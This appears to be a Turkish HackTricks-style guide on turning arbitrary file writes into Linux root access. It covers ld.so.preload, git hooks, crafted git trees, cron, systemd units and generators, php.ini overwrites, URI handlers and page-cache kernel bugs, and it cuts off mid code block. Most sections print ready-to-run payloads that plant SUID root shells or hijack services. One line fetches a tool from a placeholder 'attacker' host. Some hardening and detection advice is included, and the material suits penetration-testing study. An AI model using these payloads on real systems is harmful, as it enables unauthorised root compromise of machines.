# Root için Keyfi Dosya Yazma

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload`, dinamik bağlayıcının diğer paylaşılan nesnelerden önce yüklediği, sistem genelindeki paylaşılan nesnelerin listesidir. Güvenli yürütme modu, önceden yükleme için ek kısıtlamalar uygular; bu nedenle `/tmp/pe.so` gibi bir kütüphane yolu, tüm SUID binary'leri için geçerli bir teknik değildir.\
Bu dosyayı oluşturabilir veya değiştirebilirseniz, dosyayı yükleyen bir süreç listelenen kütüphaneyi diğer paylaşılan nesnelerinden önce yükler ve bu da o sürecin bağlamında kod yürütülmesini sağlar.<sup>[[12]](#references)</sup>

Örneğin: `echo "/tmp/pe.so" > /etc/ld.so.preload`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

### Git hooks

**Git hooks**, commit ve merge işlemleri dahil olmak üzere bir depodaki olaylar için çalıştırılan yürütülebilir scriptlerdir. **Ayrıcalıklı bir script veya kullanıcı** bu işlemleri gerçekleştiriyorsa ve saldırgan **`.git` klasörüne yazabiliyorsa**, hook **yetki yükseltme** için kullanılabilir.<sup>[[13]](#references)</sup>

Örneğin, yeni bir commit oluşturulduğunda her zaman çalıştırılması için bir git deposunda **`.git/hooks`** içinde bir **script oluşturmak** mümkündür:

```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```

### Ayrıcalıklı Git tree dışa aktarma yol geçişi

Ayrıcalıklı bir eşitleyici, checkout yapmaktan kaçınıp bunun yerine saldırganın etkileyebildiği bir depoyu `git ls-tree` ile listeleyebilir, her blob'u `git cat-file` ile okuyabilir, bildirilen yol adını bir hazırlama dizinine ekleyip dosyayı kendisi yazabilir. `-c safe.directory=*` (Git'in farklı sahipli depoları engelleyen korumasını devre dışı bırakır) seçeneğini hedef yolu kapsama denetimi olmadan kullanması, **eşitleyicinin ayrıcalıklarıyla keyfi dosya yazılmasına** yol açar. Mutlak bir tree-entry adı, Python'daki `os.path.join(stage, name)` işlevinin `stage` değerini yok saymasına neden olur; `../` içeren göreli bir ad ise dosya sistemi yolu çözümlerken üst dizinlere çıkar. Uygulama ham tree'yi Git'ten checkout etmesini istemek yerine kendisi oluşturduğundan, checkout sırasında yapılan yol adı reddi hedefi korumaz.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Root servislerinde, timer'larda, dağıtım agent'larında, şablon içe aktarıcılarında ve yedekleme/geri yükleme işlerinde şu kod yapısını arayın:<sup>[[30]](#references)</sup>

```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
    target = os.path.join(stage_root, git_path)  # no containment check
    os.makedirs(os.path.dirname(target), exist_ok=True)
    with open(target, "wb") as output:
        output.write(git("cat-file", "blob", oid))
```

Bir tree girdisi `<mode> SP <name> NUL <raw object ID>` biçiminde kodlanır. `git hash-object --literally` seçeneği, normal ayrıştırmanın veya `git fsck`'in reddedebileceği nesne verilerine bilerek izin verir; bu sayede geçici bir clone, dosya adı mutlak bir hedef olan bir tree oluşturabilir. Bu örnek bir cron dosyası blob'u oluşturur, hazırlanan tree'yi bir commit içine sarar ve bir branch'i buna taşır; ancak istismar için ayrıcalıklı işin kullandığı bir repository'yi güncelleme izni ve hatalı biçimlendirilmiş nesneyi kabul eden bir Git server gerekir.<sup>[[30]](#references)[[31]](#references)</sup>

```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```

Hardening hem repository alımını hem de son dosya sistemi işlemini kapsamalıdır:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- `safe.directory=*` yerine hizmetin güvenmesi gereken belirli repository'leri kullanın ve mümkünse repository işlemlerini root ayrıcalıkları olmadan yürütün.
- Materialization öncesinde mutlak adları ve `.` ya da `..` bileşenlerini reddedin. Birleştirme sonrasında canonicalize edin ve hedefin belirlenen kök dizinin altında kaldığını doğrulayın.
- Kontrol edip ardından açma sırasında oluşan symlink yarışlarından kaçının: güvenilir bir dizin tanıtıcısına göreli olarak açın ve Linux'ta saldırgan denetimindeki yollar için `RESOLVE_BENEATH` ile `RESOLVE_NO_SYMLINKS` kullanan `openat2()` kullanın.
- Plumbing çıktısından checkout işlemini yeniden uygulamak yerine yalıtılmış bir dizinde normal checkout yapmayı tercih edin. Ham object alımı gerekiyorsa `receive.fsckObjects=true` gibi alım tarafı doğrulamasını etkinleştirin; hazırlanmış tree'leri reddetmek için gereken yol adıyla ilgili `receive.fsck.*` bulgularının önemini azaltmayın.

### Ayrıcalıklı yapılandırma dağıtımı

Bazı yönetim hizmetleri, amaçlanan sistem durumunu bir yapılandırma dosyasında saklar ve daha sonra bu durumu yükseltilmiş ayrıcalıklarla dağıtır. Örneğin, [openmediavault yapılandırmayı `/etc/openmediavault/config.xml` içinde saklar](https://docs.openmediavault.org/en/7.x/faq.html) ve [RPC arayüzü](https://docs.openmediavault.org/en/8.x/development/tools/omv_rpc.html) hizmet değişikliklerini uygulayabilir. Daha düşük ayrıcalıklı bir hesap bu dosyaya yazabiliyor veya dosyayı değiştirebiliyorsa, yetkili bir dağıtım isteğinde bulunup bulunamayacağını ve seçilen modülün değiştirilen alanı root olarak kullanıp kullanmadığını inceleyin. SSH hesap anahtarları, zamanlanmış komutlar ve paket kurulumu farklı önkoşullara sahiptir; dosyanın mevcut olması veya XML dosyasının yazılabilir olması bunlardan herhangi birini kanıtlamaz. Dosya ve üst dizin izinlerini, çağıranın gruplarını ve RPC yetkilendirmesini, kurulu sürümü ve gerçek tüketiciyi kontrol edin; inceleme sırasında yapılandırmayı düzenlemeyin veya apply işlemi çağırmayın.

`/etc/fail2ban/action.d/` altındaki Fail2Ban action tanımları da ayrıcalıklı bir yapılandırma sınırıdır. Bu dizine yazabilen ve dizinde arama yapabilen bir kullanıcı, bir action tanımını değiştirebilir veya bir override ekleyebilir; ancak yalnızca dizin izinleri kod yürütüldüğünü kanıtlamaz. Etkin bir jail'in gerçekten etkilenen action'ı seçtiğini, Fail2Ban hizmetinin bunu daha yüksek ayrıcalıklarla çalıştırdığını ve yetkili bir reload/restart işlemiyle eşleşen bir ban olayının gerçekleşeceğini doğrulayın. Fail2Ban'i yeniden başlatmaya yönelik ilgisiz bir sudo izni, yalnızca tam olarak ilgili hizmet çağrısı için geçerliyse ve değiştirilen tanım yükleniyorsa anlam taşır. [Fail2Ban'in action yapılandırması](https://github.com/fail2ban/fail2ban/blob/master/man/jail.conf.5), action dizini ile jail arasındaki ilişkiyi belgeler; [örnek action](https://github.com/fail2ban/fail2ban/blob/master/config/action.d/iptables.conf), `actionban` komutunun ban sırasında hizmet kullanıcısının haklarıyla çalıştığını gösterir. İnceleme sırasında action'ları değiştirmeden veya ban tetiklemeden izinleri ve etkin yapılandırmayı inceleyin.

Etkin bir Fail2Ban jail'i WHOIS ile zenginleştirilmiş bir mail action kullandığında ayrı bir sınır oluşur. [CVE-2021-32749](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm), GNU mailutils `mail` komutuna pipe edilen güvenilmeyen WHOIS metnini konu alıyordu; bu komutun escape işlemesi bir komut çalıştırabiliyordu. Daha düşük ayrıcalıklı bir dosya yazarı, **seçilen WHOIS istemcisinin** sunucu geçersiz kılma yapılandırmasını değiştirebiliyorsa yanıtı etkileyebilir; [Debian'ın `whois.conf(5)` belgesi](https://manpages.debian.org/bookworm/whois/whois.conf.5.en.html) bu tür dosyalardan birini açıklar, ancak dosyanın yolu ve kullanımı kuruluma göre değişir. Etkin jail/action'ı, hizmet kimliğini, gerçek WHOIS istemcisini ve yapılandırma yolunu, mail uygulamasını, yanıt üzerindeki denetimi ve kurulu satıcı düzeltmesini veya backport'u inceleyin. Yazılabilir bir WHOIS yapılandırma dosyası, bir Fail2Ban sürümü veya tek başına bir mail action bu zinciri kanıtlamaz; pasif inceleme sırasında harici bir sunucuya sorgu göndermekten veya ban tetiklemekten kaçının.

### TFTP dosya oluşturma ve ayrıcalıklı paket hook'ları

Erişilebilir bir TFTP hizmeti, **etkin** tftpd-hpa ayarları root olarak çalışmasını, dosya sistemi kökünü `--secure` dizini olarak sunmasını ve `--create` seçeneğini etkinleştirmesini sağlıyorsa container veya yerel kullanıcı sınırını aşabilir. [tftpd-hpa kılavuzu](https://manpages.debian.org/trixie/tftpd-hpa/tftpd.8.en.html), dosya oluşturma ve kullanıcı seçeneklerini açıklar. Bu, `/etc/apt/apt.conf.d/` dahil ayrıcalıklı bir yapılandırma dizininde yeni bir dosya oluşturma olasılığı sunar; mevcut bir dosyanın üzerine yazmak yine de mümkün olmayabilir. [APT yapılandırma kılavuzu](https://manpages.debian.org/bookworm/apt/apt.conf.5.en.html), `APT::Update::Pre-Invoke` komutlarını belgeler. Root olarak çalışan bir `apt update`, yalnızca yeni yapılandırma dosyasını okuyorsa daha yüksek ayrıcalıklı tüketici olabilir. Çalışan daemon'un gerçek argümanlarını ve kimliğini, ağ erişilebilirliğini ve filtrelemeyi, hedef dizinin dosya oluşturma politikasını, APT'nin etkin yapılandırma kapsamını ve daha sonraki ayrıcalıklı bir çağrıyı doğrulayın. Varsayılan bir dosya, yazılabilir bir hedef dizin veya zamanlanmış bir APT komutu tek başına tüm yolu kanıtlamaz. Pasif inceleme sırasında yalnızca sınırlandırılmış yerel yapılandırma ve metadata'yı okuyun; dosya yüklemeyin veya APT'yi çalıştırmayın.

### Cron ve zaman dosyaları

Root'un çalıştırdığı cron ile ilgili dosyalara **yazabiliyorsanız**, iş bir sonraki çalıştığında genellikle kod yürütme elde edebilirsiniz. İlgi çekici hedefler şunlardır:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- `/var/spool/cron/` veya `/var/spool/cron/crontabs/` altındaki root'un kendi crontab'ı
- `systemd` timer'ları ve tetikledikleri hizmetler

Hızlı kontroller:

```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```

Tipik kötüye kullanım yolları:

- `/etc/crontab` dosyasına veya `/etc/cron.d/` içindeki bir dosyaya **yeni bir root cron job ekleyin**
- `run-parts` tarafından zaten çalıştırılan bir scripti **değiştirin**
- Başlattığı scripti veya binary'yi değiştirerek **mevcut bir timer hedefini backdoor'layın**

Minimal cron payload örneği:

```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```

`run-parts` tarafından kullanılan bir cron dizinine yalnızca yazabiliyorsanız, bunun yerine oraya çalıştırılabilir bir dosya bırakın:

```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```

Notlar:

- `run-parts` genellikle adında nokta bulunan dosyaları yok sayar; bu nedenle `backup.sh` yerine `backup` gibi adları tercih edin.<sup>[[15]](#references)</sup>
- Bazı sistemler klasik cron yerine `systemd` timer'ları kullanır; ancak kötüye kullanım fikri aynıdır: **root'un daha sonra çalıştıracağı şeyi değiştirin**.<sup>[[20]](#references)</sup>

### Service & Socket dosyaları

**`systemd` unit dosyalarına** veya bu dosyaların başvurduğu dosyalara yazabiliyorsanız, unit'i yeniden yükleyip yeniden başlatarak ya da service/socket etkinleştirme yolunun tetiklenmesini bekleyerek root olarak code execution elde edebilirsiniz.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

ACL'ler de dahil olmak üzere, system unit dizininin kendisinde yazma ve arama erişimini de kontrol edin: dizinin okunması/listelenmesi engellense bile bir kullanıcı `/etc/systemd/system` altında yeni bir unit oluşturabilir. Ancak yalnızca bu yola erişebilmek hiçbir şeyi başlatmaz. System manager'ın yeni unit'i yükleyeceğini, çağıranın adı için root yetkisi sağlayan etkili bir `systemctl start` veya `restart` iznine (ya da başka bir ayrıcalıklı etkinleştirme yoluna) sahip olduğunu ve service'in amaçlanan kimlikle çalıştığını doğrulayın. Diskte değiştirilmiş, önceden yüklenmiş bir unit için `daemon-reload` gerekebilir; yeni adlandırılmış bir unit'in yüklenme davranışı farklıdır. Wildcard restart kuralının yeterli olduğunu varsaymadan önce sudo argümanlarını ve hariç tutmaları dikkatlice inceleyin. [systemd unit arama yoluna](https://www.freedesktop.org/software/systemd/man/latest/systemd.unit.html) ve [systemctl yükleme ve yeniden yükleme semantiğine](https://www.freedesktop.org/software/systemd/man/latest/systemctl.html) bakın.

İlgi çekici hedefler:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- `/etc/systemd/system/<unit>.d/*.conf` altındaki Drop-in geçersiz kılmaları
- `ExecStart=`, `ExecStartPre=`, `ExecStartPost=` tarafından başvurulan service script'leri/binary'leri
- Root service tarafından yüklenen, yazılabilir `EnvironmentFile=` yolları

Hızlı kontroller:

```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```

Yaygın kötüye kullanım yolları:

- Değiştirebildiğiniz, root tarafından sahip olunan bir service unit içindeki **`ExecStart=` değerinin üzerine yazın**
- Kötü amaçlı bir `ExecStart=` içeren **drop-in override ekleyin** ve önce eski değeri temizleyin
- Unit tarafından zaten referans verilen script/binary'ye **backdoor yerleştirin**
- Socket bağlantı aldığında başlayan ilgili `.service` dosyasını değiştirerek **socket-activated bir service'i ele geçirin**

Kötü amaçlı override örneği:

```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```

Tipik etkinleştirme akışı:

```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```

Bir servisi kendiniz yeniden başlatamıyor ancak socket-activated bir unit'i düzenleyebiliyorsanız, arka kapı eklenmiş servisin root olarak çalışmasını tetiklemek için yalnızca **bir istemci bağlantısı beklemeniz** gerekebilir.<sup>[[17]](#references)</sup>

### systemd generator dizinleri

**System generator**'lar, unit dosyalarını yüklemeden önce system manager tarafından hem açılış sırasında hem de yapılandırma yeniden yüklendiğinde çalıştırılan yürütülebilir dosyalardır. Bu nedenle, bir system-generator dizinine (veya mevcut bir yürütülebilir generator'a) yazma erişimi, denetim yalnızca `*.service` ve `*.timer` dosyalarını kontrol ettiğinde kolayca gözden kaçabilecek, doğrudan root kod yürütme olanağı sağlar.<sup>[[35]](#references)[[36]](#references)</sup>

Genellikle arama sırası `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/` ve `/usr/lib/systemd/system-generators/` şeklindedir (bazı dağıtımlarda `/lib/systemd/system-generators/`, `/usr` birleştirmesi aracılığıyla sunulur). Daha önceki bir dizinde aynı ada sahip bir yürütülebilir dosya, sonraki dizindekini gölgeler. Bu **girdi yürütülebilir dosya dizinlerini**, generator'ların oluşturduğu geçici unit çıktılarını içeren `/run/systemd/generator`, `/run/systemd/generator.early` ve `/run/systemd/generator.late` dizinleriyle karıştırmayın.<sup>[[35]](#references)</sup>

Hızlı kontroller:

```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
         /usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
         /lib/systemd/system-generators; do
    [ -e "$d" ] || continue
    namei -l "$d"
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
    getfacl -p "$d" "$d"/* 2>/dev/null
done
```

Yeni oluşturulan bir generator'ın çalıştırılabilir biti ayarlanmış olmalıdır. Write primitive baytları kontrol ediyor ancak modu kontrol etmiyorsa, zaten çalıştırılabilir olan bir generator'ı hedefleyin; dosyanın içeriğini yerinde kesmek genellikle meta verilerini korur. Dizinin kendisi yazılabilir durumdaysa, yeni bir giriş oluşturup çalıştırılabilir olarak işaretleyin.<sup>[[35]](#references)</sup>

```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```

`systemctl daemon-reload` komutunu **system** manager'a karşı çalıştırmak için uygun yetkilendirme gerekir; ancak bu komut tüm system generator'ları yeniden çalıştırır. Aksi takdirde yetkili bir reload, package işlemi veya reboot gerçekleşmesini bekleyin. `~/.config/systemd/user-generators/` gibi user-generator dizinleri user manager altında çalışır ve tek başlarına **root** yetkisi sağlamaz.<sup>[[35]](#references)</sup>

Hardening ve hunting için yalnızca son bileşenin mode bit'lerini değil, her path bileşenini ve ACL'yi doğrulayın; generator'ların hash'lerini ve package sahipliğini temel değerlerle karşılaştırın; tüm system-generator girdi dizinlerinde oluşturma, yeniden adlandırma, içerik veya izin değişiklikleri için alarm verin. Yazma işlemini izlemek önemlidir; çünkü tek seferlik bir generator çalıştıktan sonra kendini silebilir, `/run/systemd/generator*` altındaki oluşturulan unit ağacı ise bir sonraki reload'da yeniden oluşturulur.<sup>[[35]](#references)[[36]](#references)</sup>

### Privileged PHP sandbox tarafından kullanılan kısıtlayıcı bir `php.ini` dosyasının üzerine yazma

Bazı özel daemon'lar, kullanıcı tarafından sağlanan PHP kodunu **kısıtlı bir `php.ini`** ile `php` çalıştırarak doğrular (örneğin, `disable_functions=exec,system,...`). Sandbox'taki kodda hâlâ **herhangi bir yazma primitive'i** (ör. `file_put_contents`) varsa ve daemon tarafından kullanılan **tam `php.ini` path'ine** erişebiliyorsanız, kısıtlamaları kaldırmak için **bu config'in üzerine yazabilir**, ardından yükseltilmiş ayrıcalıklarla çalışan ikinci bir payload gönderebilirsiniz.<sup>[[2]](#references)</sup>

Tipik akış:

1. İlk payload sandbox config'inin üzerine yazar.
2. Tehlikeli fonksiyonlar yeniden etkinleştirildiğinde ikinci payload kodu çalıştırır.

Minimal örnek (daemon tarafından kullanılan path'i değiştirin):

```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```

Daemon root olarak çalışıyorsa (veya root sahipli yolları doğruluyorsa), ikinci çalıştırma root context sağlar. Sandboxed runtime hâlâ dosya yazabiliyorsa bu, temelde **config overwrite yoluyla privilege escalation** anlamına gelir.

### binfmt_misc

`binfmt_misc`, kayıtları `/proc/sys/fs/binfmt_misc` altında sunar; her kayıt bir dosya türü kalıbını bir interpreter ile ilişkilendirir. Ayrıcalık etkisi, kaydı kimin değiştirebildiğine ve eşleşen dosyayı daha sonra hangi sürecin çalıştırdığına bağlıdır. Bu nedenle, bunu bir privilege-escalation yolu olarak değerlendirmeden önce bu gereksinimleri doğrulayın.<sup>[[21]](#references)</sup>

`CAP_DAC_OVERRIDE` yeteneğine sahip bir executable helper, çağıranın bu düğüme doğrudan yazamadığı durumlarda bile, çağıran tarafından kontrol edilen verileri kabul edip `/proc/sys/fs/binfmt_misc/register` dosyasına yazıyorsa ayrı bir kayıt yolu oluşturabilir. Envanter çıkarırken helper'ı çalıştırmadan girdilerini ve yazma davranışını inceleyin. Kayıtlı bir kural `C` flag'ini kullanıyorsa interpreter, eşleşen binary'ye dayalı kimlik bilgilerini alır; dolayısıyla root sahipli bir SUID eşleşmesi, çağıranın kontrol ettiği bir interpreter'ı root olarak çalıştırabilir. `binfmt_misc` mount'unu ve kayıt politikasını, helper'ın etkin yeteneğini, kuralı ve interpreter yolunu, SUID hedefinin executable olup olmadığını ve `no_new_privs` ya da `nosuid` mount'unun SUID geçişini engelleyip engellemediğini doğrulayın. Tek başına bir capability biti veya gömülü bir yol dizgesi, yalnızca inceleme için ipucudur.<sup>[[21]](#references)</sup> SUID'nin engellendiği koşullar için [execve(2)](https://man7.org/linux/man-pages/man2/execve.2.html) sayfasına bakın.

### URI şeması işleyicilerinin üzerine yazma (http: veya https: gibi)

Desktop environment'lar, URI şemaları için bir uygulama seçerken MIME ilişkilendirmelerini ve desktop entry'leri kullanır. İlgili kullanıcı başına yapılandırma ve desktop entry dizinlerine yazabilen bir saldırgan, bu şemaları kontrol ettiği bir launcher'a yönlendirebilir. `$HOME/.config/mimeapps.list` dosyasını değiştirerek HTTP ve HTTPS URL işleyicilerini kötü amaçlı bir dosyaya yönlendirmek (örneğin, `x-scheme-handler/http=evil.desktop` ve `x-scheme-handler/https=evil.desktop`) kullanıcının bir tıklamasının bu desktop entry'yi çalıştırmasına yol açabilir.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```

### Root'un kullanıcı tarafından yazılabilir script'leri/binary'leri çalıştırması

Ayrıcalıklı bir iş akışı `/bin/sh /home/username/.../script` gibi bir komut çalıştırıyorsa (veya ayrıcalıksız bir kullanıcıya ait dizindeki herhangi bir binary'yi), bunu ele geçirebilirsin:<sup>[[1]](#references)</sup>

- **Çalıştırmayı tespit et:** root'un kullanıcı denetimindeki yolları çağırdığını yakalamak için pspy ile süreçleri izle.<sup>[[25]](#references)</sup>

```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```

- **Yazılabilirliği doğrulayın:** hedef dosyanın ve dizinin kullanıcınıza ait ve kullanıcı tarafından yazılabilir olduğundan emin olun.
- **Hedefi ele geçirin:** orijinal binary/script dosyasını yedekleyin ve SUID shell oluşturan (veya root düzeyinde başka bir işlem yapan) bir payload bırakın, ardından izinleri geri yükleyin:

```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```

- **Ayrıcalıklı eylemi tetikleyin** (ör. helper'ı başlatan bir UI düğmesine basın). Root, ele geçirilmiş yolu yeniden çalıştırdığında, yükseltilmiş shell'i `./rootshell -p` ile alın.

### Ayrıcalıklı binary'lerde yalnızca page cache üzerinde dosya değişikliği

Bazı kernel bug'ları dosyayı **diskte** değiştirmez. Bunun yerine yalnızca okunabilir bir dosyanın **page cache kopyasını** değiştirmenize olanak tanır. Bir **setuid** binary'yi veya başka bir şekilde **root tarafından çalıştırılan** bir binary'yi hedefleyebilirseniz, diskteki dosya hash'i değişmemiş olsa bile sonraki çalıştırma bellekteki saldırgan denetimli baytları kullanabilir ve ayrıcalık yükseltebilir.<sup>[[3]](#references)[[4]](#references)</sup>

Bunu **yalnızca çalışma zamanında geçerli olan dosya yazma primitive'i** olarak düşünmek yararlıdır:<sup>[[3]](#references)</sup>

- **Disk temiz kalır**: inode ve diskteki baytlar değişmez
- **Bellek değişir**: önbelleğe alınmış sayfayı okuyan/çalıştıran süreçler, saldırgan tarafından değiştirilmiş içeriği alır
- **Etki geçicidir**: değişiklik yeniden başlatma veya cache'ten çıkarılma sonrasında kaybolur

Bu primitive, klasik **arbitrary file write** ile Dirty COW / Dirty Pipe gibi eski **page cache abuse** bug'ları arasında yer alır:<sup>[[3]](#references)</sup>

- Dirty COW bir race'e dayanıyordu
- Dirty Pipe'ın yazma konumuyla ilgili kısıtlamaları vardı
- Güvenlik açığı bulunan yol, dosyaya bağlı cache sayfalarına doğrudan yazma olanağı veriyorsa, yalnızca page cache'i etkileyen bir primitive daha güvenilir olabilir

#### Genel privesc akışı

1. **Dosyaya bağlı page cache sayfalarına** yazabilen bir kernel primitive'i edinin
2. Bunu **okunabilir, ayrıcalıklı bir binary'ye** veya root tarafından çalıştırılan başka bir dosyaya karşı kullanın
3. Sayfa cache'ten atılmadan **önce** dosyanın çalıştırılmasını tetikleyin
4. Diskteki dosya değiştirilmemiş görünürken root olarak code execution elde edin

Genellikle yüksek değerli hedefler:

- **setuid-root** binary'ler
- **Root servisleri** tarafından başlatılan helper'lar
- **Host kernel/page cache'ini paylaşan container'lar** içinden sık çalıştırılan binary'ler

#### AF_ALG + `splice()` örnek yolu

Copy Fail (CVE-2026-31431) bu sınıfa iyi bir örnektir. Güvenlik açığı bulunan yol, Linux crypto userspace API'sindeydi (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()`, okunabilir bir dosyadaki page cache sayfalarına ait referansları crypto TX scatterlist'ine taşıyabilir
- Yerinde çalışan `algif_aead` decrypt yolu, kaynak ve hedef buffer'ları yeniden kullandı
- Ardından `authencesn`, hedef tag bölgesine yazdı
- Bu bölge hâlâ splice edilmiş, dosyaya bağlı sayfalara referans veriyorsa, yazma işlemi **hedef dosyanın page cache'ine** yapıldı

Dolayısıyla ilgi çekici teknik CVE'nin kendisi değil, şu örüntüdür:

- **Dosyaya bağlı cache sayfalarını bir kernel subsystem'ine aktarın**
- subsystem'in bunları **yazılabilir çıktı** olarak görmesini sağlayın
- bellekte kontrollü, küçük bir üzerine yazma işlemi tetikleyin

Herkese açık PoC, `/usr/bin/su` dosyasını bellekte yamalamak için tekrarlanan **4-byte yazmalar** kullandı ve ardından dosyayı çalıştırdı.<sup>[[4]](#references)[[7]](#references)</sup>

#### ESP / XFRM + netfilter TEE clone örnek yolu

DirtyClone (CVE-2026-43503), aynı **yalnızca page cache'e yazma yoluyla root elde etme** örüntüsünün başka bir çeşidini gösterir; bu kez hedef `AF_ALG` yerine **IPsec ESP decrypt** işlemidir.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Önemli teknik **metadata-laundering** adımıdır:

- `splice()`, **salt okunur, dosyaya bağlı bir page cache sayfasını** ESP-in-UDP paketine yerleştirir
- Orijinal DirtyFrag mitigation, `esp_input()` işleminin **decrypt işleminden önce kopyalama yapmasını** sağlamak için skb'yi `SKBFL_SHARED_FRAG` ile işaretledi
- Netfilter `TEE`, paketi `nf_dup_ipv4()` -> `__pskb_copy_fclone()` üzerinden çoğaltır
- Clone, aynı **fiziksel page cache referansını** korur ancak `SKBFL_SHARED_FRAG` işaretini kaybeder
- Bunun üzerine `esp_input()`, clone'u güvenli kabul eder ve dosyaya bağlı sayfa üzerinde yerinde **`cbc(aes)` decrypt** işlemi yapar

Dolayısıyla inceleme açısından çıkarılacak ders CVE'den daha geneldir: Bir mitigation, önce kopyalama gerekip gerekmediğine **skb/page metadata** üzerinden karar veriyorsa, arka plandaki sayfayı korurken metadata'yı düşüren herhangi bir **clone/copy yolu**, yazma primitive'ini fark edilmeden yeniden açabilir.

Tipik exploitation akışı:

1. Özel bir network namespace içinde **`CAP_NET_ADMIN` elde etmek** için `unshare(CLONE_NEWUSER | CLONE_NEWNET)` çalıştırın
2. Loopback'i etkinleştirin ve `mangle/OUTPUT` içine bir **netfilter `TEE` kuralı** ekleyin
3. `NETLINK_XFRM` üzerinden **XFRM ESP transport SA**'ları kurun
4. DirtyFrag'ın word-selection hilesini kullanarak her hedef 4-byte word'ü SA `seq_hi` alanına kodlayın
5. Splice edilmiş ESP-in-UDP paketini göndererek **TEE clone'unun** `esp_input()`'a ulaşmasını ve **yerinde decrypt** yapmasını sağlayın
6. `/usr/bin/su` dosyasının veya başka bir ayrıcalıklı executable'ın page cache kopyasında saldırgan denetimli kod bulunana kadar tekrarlayın

Operasyonel açıdan etki, `AF_ALG` örneğindekiyle aynıdır: Diskteki dosya temiz kalır ancak `execve()`, **değiştirilmiş page cache baytlarını** kullanır ve root erişimi sağlar.<sup>[[8]](#references)[[9]](#references)</sup>

Bu varyant için yararlı exposure kontrolleri:

```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```

Kısa vadeli saldırı yüzeyi azaltma da burada yola özgüdür: `48f6a5356a33` içeren bir kernel sürümüne yükseltmek clone yolunu düzeltirken, `xt_TEE` autoload'unu engellemek **flag-laundering adımını**, `esp4` / `esp6` yüklenmesini engellemek ise **decrypt sink'i** ortadan kaldırır.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Maruziyet ve avcılık

Bu tür bir bug'dan şüpheleniyorsanız yalnızca disk bütünlüğü kontrollerine güvenmeyin. Ayrıca şunları doğrulayın:

```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
